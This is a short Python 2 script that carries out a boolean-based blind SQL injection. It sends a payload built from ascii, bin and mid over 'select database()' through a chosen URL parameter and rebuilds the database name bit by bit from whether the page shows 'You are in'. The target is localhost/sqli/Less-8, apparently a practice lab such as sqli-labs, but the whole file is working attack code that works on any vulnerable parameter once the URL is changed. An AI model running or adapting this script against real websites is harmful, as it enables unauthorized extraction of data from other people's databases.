#!/usr/bin/python

import httplib
import sys
import threading
import time
import urlparse
import urllib
from collections import OrderedDict
from os import _exit,system


def connect(host,port,verb,path,query,data=None,headers={}):
	path = path +'?'+ urllib.urlencode(query)
	h = httplib.HTTPConnection(host,int(port))
	h.request("GET",path,"",{})
	return h.getresponse().read()

def request(url):
	parser = urlparse.urlparse(url)
	request.host = parser.netloc.split(':')[0]
	request.port = 80 if 'http' in parser.scheme else parser.netloc.split(':')[1]
	request.query = OrderedDict(urlparse.parse_qsl(parser.query))
	request.path = parser.path
	return request
	
def inject(url,vuln_param=None,prefix=None,suffix=None,verb=None):

	parser = request(url)
	verb = verb if verb else "GET"
	tc = 'You are in...........';
	rc = 0

	val = ""
	
	for x in range(1,9):
		b = '0'
		for y in range(2,9):
			payload = " 1' AND (select mid((lpad(bin(ascii(mid((select database()),%d,1))),8,0)),%d,1)) AND '1'='1" %(x,y)
			
			if vuln_param in parser.query.keys():
				parser.query[vuln_param] =  payload
			else:
				_exit(1)
			st = time.time()
			rc += 1
			response = connect(parser.host,parser.port,verb,parser.path,parser.query)
			et = int(time.time() - st)
			if et >= 1:
				break
			else:
				if tc in response:
					# print 'found'
					b += '1'
				else:
					b += '0'
		system('cls')
		print b
		val += chr(int(b,2))	
		print "Database Name : {0}".format(val),
		sys.stdout.flush()
	print "\n[+] No of requests %d" %rc
	
				

inject("http://localhost/sqli/Less-8/index.php?id=1",vuln_param="id")